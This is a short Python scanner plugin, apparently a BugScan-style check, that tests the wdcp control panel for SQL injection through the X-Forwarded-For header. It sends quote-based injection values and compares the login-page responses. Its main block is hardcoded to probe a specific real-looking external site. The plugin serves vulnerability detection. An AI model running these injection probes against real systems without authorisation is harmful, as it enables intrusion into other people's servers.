def assign(service, arg):
    if service == "wdcp":
        return True, arg

def audit(args):
    payload = ["X-Forwarded-For: 1'#",
               "X-Forwarded-For: 1'",
               ]
    verify_url= args
    code, head, content, errcode,finalurl = curl.curl("-H \"%s\" %s" % (payload[0],verify_url))
    code1, head1, content1, errcode1,finalurl1 = curl.curl("-H \"%s\" %s" % (payload[1],verify_url))
    if code==200 and 'Submit_login' in content and code1==200 and 'Submit_login' not in content1:
        security_hole("X-Forwarded-For sql inject:"+verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wdcp', 'http://fengdu.cq.cn:8080/')[1])
